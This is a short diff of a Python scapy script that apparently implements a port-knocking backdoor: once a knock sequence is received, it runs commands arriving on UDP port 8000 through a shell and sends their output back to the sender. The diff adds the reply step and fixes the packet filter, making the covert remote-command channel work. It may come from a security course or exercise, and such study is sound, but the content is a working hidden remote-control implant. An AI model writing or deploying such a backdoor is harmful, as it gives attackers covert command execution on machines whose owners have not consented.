@@ -63,12 +63,13 @@ def runCommand(packet):
             output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = password + output.stdout.read() + output.stderr.read()
             packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
+            send(packet)
 
 def main():
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
     print "test"
-    sniff("dst port 8000", prn=runCommand)
+    sniff(filter="dst port 8000", prn=runCommand)
 
 if __name__ == '__main__':
     main()
